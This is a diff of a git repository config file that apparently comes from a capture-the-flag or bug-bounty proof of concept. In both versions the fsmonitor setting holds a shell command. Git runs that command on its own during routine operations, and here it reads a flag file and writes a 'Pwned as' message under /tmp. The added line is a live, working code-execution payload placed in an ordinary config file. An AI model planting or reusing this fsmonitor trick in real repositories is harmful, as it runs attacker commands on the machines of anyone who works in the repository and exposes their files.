@@ -2,4 +2,4 @@
     repositoryformatversion = 0
     bare = false
     worktree = ./
-    fsmonitor = "echo \"Pwned as $(cat /flag.txt)\">/tmp/test4google/11.txt; false"
+    fsmonitor = "echo \"Pwned as $(cat /flag)\">/tmp/https%3A%2F%2Fgithub%2ecom%2Fkee1ongz%2Ftest4google%2egit/11.txt; false"
